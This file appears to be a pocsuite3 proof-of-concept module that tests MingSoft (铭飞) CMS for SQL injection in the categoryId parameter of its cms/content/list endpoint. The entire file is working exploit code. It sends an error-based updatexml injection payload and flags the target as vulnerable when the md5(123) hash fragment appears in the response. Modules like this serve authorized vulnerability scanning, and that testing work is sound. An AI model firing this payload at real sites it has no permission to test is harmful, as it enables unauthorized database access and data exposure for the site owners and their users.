# _*_ coding:utf-8 _*_
# @Time : 2023/12/23
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class mingfei_list_sql(POCBase):
    pocDesc = '''铭飞CMS cms/content/list接口SQL注入'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-23'
    name = '铭飞CMS cms/content/list接口SQL注入漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/cms/content/list?categoryId=1%27%20and%20updatexml(1,concat(0x7e,md5(123),0x7e),1)%20and%20%271'
        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            'Connection': 'Keep-Alive'
        }
        try:


            response = requests.get(url, headers=headers)
            if response.status_code == 200 and '202cb962ac5' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(mingfei_list_sql)